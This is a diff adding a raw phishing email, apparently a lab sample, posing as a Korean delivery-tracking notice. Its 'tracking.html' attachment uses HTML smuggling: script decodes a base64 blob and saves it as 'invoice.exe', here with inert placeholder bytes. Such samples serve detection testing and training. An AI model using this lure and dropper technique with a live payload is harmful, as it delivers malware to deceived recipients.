@@ -1,0 +1,22 @@
+From: "배송 안내" <noreply@delivery-news.com>
+Return-Path: <noreply@delivery-news.com>
+Received-SPF: pass client-ip=198.51.100.5
+Subject: 배송 조회 안내
+To: user@bank.lab
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="X"
+
+--X
+Content-Type: text/plain; charset=utf-8
+
+첨부된 파일에서 배송 상태를 확인하세요.
+--X
+Content-Type: text/html; name="tracking.html"
+Content-Disposition: attachment; filename="tracking.html"
+
+<html><script>
+var data = atob("QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=");
+var blob = new Blob([data], {type: "application/octet-stream"});
+window.navigator.msSaveOrOpenBlob(blob, "invoice.exe");
+</script></html>
+--X--
